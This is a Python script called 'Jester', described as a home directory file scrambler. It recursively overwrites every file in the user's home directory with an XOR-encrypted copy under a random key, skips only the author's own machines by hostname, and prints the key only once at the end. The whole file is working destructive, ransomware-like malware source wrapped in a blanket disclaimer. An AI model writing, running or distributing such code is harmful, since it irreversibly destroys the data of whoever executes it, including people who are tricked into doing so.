import os
import sys
import time
import random
import string
import socket

MASTER_FILENAME = "Jester"
DESCRIPTION = "A home directory file scrambler."
PROJECT_LINK = "https://rethy.xyz/Projects/Jester"
# Won't run on any of the following matching hostnames.
HOSTNAMES = [ "SUPERMICRO-PC", "THINKPAD-E570", "THINKPAD-E550" ]
# Take source path as current users's ~ (home directory).
SOURCE_PATH = os.path.expanduser("~")
EXEMPTIONS = [ sys.argv[0], ".dll" ]
DISCLAIMER = "This SOFTWARE PRODUCT is provided by THE PROVIDER \"as is\" and \"with all\nfaults.\" THE PROVIDER makes no representations or warranties of any kind\nconcerning the safety, suitability, lack of viruses, inaccuracies, typographical\nerrors, or other harmful components of this SOFTWARE PRODUCT.  There are\ninherent dangers in the use of any software, and you are solely responsible for\ndetermining whether this SOFTWARE PRODUCT is compatible with your equipment and\nother software installed on your equipment. You are also solely responsible for\nthe protection of your equipment and backup of your data, and THE PROVIDER will\nnot be liable for any damages you may suffer in connection with using,\nmodifying, or distributing this SOFTWARE PRODUCT."

def logo():
    print("    0_")
    print("     \\`.     ___)")
    print("      \\ \\   / __>0")
    print("  /\  /  |/' /")
    print(" /  \\/   `  ,`'--.")
    print("/ /(___________)_ \\")
    print("|/ //.-.   .-.\\\\ \\ \\")
    print("0 // :@ ___ @: \\\\ \\/")
    print("  ( o ^(___)^ o ) 0")
    print("   \\ \\_______/ /")
    print("    \'._______.\'")
    print("")
def MOTD():
    print(f"{DESCRIPTION}")
    print("rethy.xyz (C) 2023")
    print("")
def disclaimer():
    print(f"{DISCLAIMER}")
    print("")

def generateKey(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def encryptFile(filePath, encryptionKey):
    # Initialize destination byte array variable. We'll replace the source file
    # with this later on.
    encryptedData = bytearray()

    # Read file data as a raw byte array for each string.
    with open(filePath, 'rb') as file:
        data = file.read()

    # i is equal to the current index of the byte array.
    for i in range(len(data)):
        # The buffer byte var is equal to an index of the byte array.
        byte = data[i]
        # xorByte is equal to the flipped bits according to the encryption key.
        xorByte = byte ^ ord(encryptionKey[i % len(encryptionKey)])
        # Append xor'd byte to destination buffer array.
        encryptedData.append(xorByte)

    # Write the destination encryptedData byte array to the source file, overwritting it.
    with open(filePath, 'wb') as file:
        file.write(encryptedData)

def encryptFilesInDirectory(directoryPath, encryptionKey):
    # Get files and directories recursively, starting at the user's home
    # directory.
    for subdir, dirs, files in os.walk(directoryPath):
        for file in files:
            exemptionMet = False
            filePath = os.path.join(subdir, file)

            # TODO: Optimize this. This isn't a great solution.
            for exemption in EXEMPTIONS:
                if exemption in filePath:
                    print(f"Exempt: {filePath}")
                    exemptionMet = True
                    break
            if exemptionMet:
                continue

            try:
                encryptFile(filePath, encryptionKey)
                print(f"{filePath}")
            except PermissionError:
                print(f"Permission error: {filePath}")
            except IOError:
                print(f"IOError: {filePath}")

    return encryptionKey

# Return the current system hostname.
def hostname():
    return socket.gethostname()

def main():
    # Display Jester logo.
    logo()
    # Display MOTD text, and description/disclaimer.
    MOTD()
    # Display legal disclaimer.
    disclaimer()

    # Initialize encryption key.
    encryptionKey = generateKey(16)

    # A killswitch for certain matching hostnames.
    if hostname() in HOSTNAMES:
        print("Not running on the " + hostname() + " system!")
        sys.exit(0)

    # Buffer time before running. Last chance.
    print(f"Running {MASTER_FILENAME} in 3 seconds...")
    print(f"Press Ctrl + C to quit at any time.")
    time.sleep(3)
    print("")

    # Start the encryption process.
    encryptFilesInDirectory(SOURCE_PATH, encryptionKey)
    print("")

    # Output final encryption key.
    print("#" * (len(encryptionKey) + 4))
    print(f"# {encryptionKey} #")
    print("#" * (len(encryptionKey) + 4))

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("Quitting.")
        sys.exit(0)